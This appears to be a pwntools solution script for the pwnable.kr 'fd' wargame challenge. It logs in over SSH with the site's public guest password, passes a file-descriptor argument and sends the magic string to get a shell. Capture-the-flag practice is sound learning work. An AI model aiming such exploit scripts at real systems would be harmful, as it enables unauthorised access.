from pwn import *
#context.log_level='debug'

s = ssh('fd','pwnable.kr',port=2222,password='guest')
p = s.process(['./fd','4660'])

p.sendline('LETMEWIN')

p.interactive()
